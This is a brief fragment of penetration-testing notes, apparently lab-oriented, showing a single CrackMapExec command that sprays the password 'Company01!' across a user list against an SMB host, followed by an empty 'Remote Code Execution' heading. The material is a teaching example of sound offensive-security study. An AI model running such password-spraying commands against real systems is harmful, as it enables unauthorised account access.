
## Protocol Specific Attacks

Password spraying can be done with CrackMapExec on SMB

```shell-session
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

### Remote Code Execution



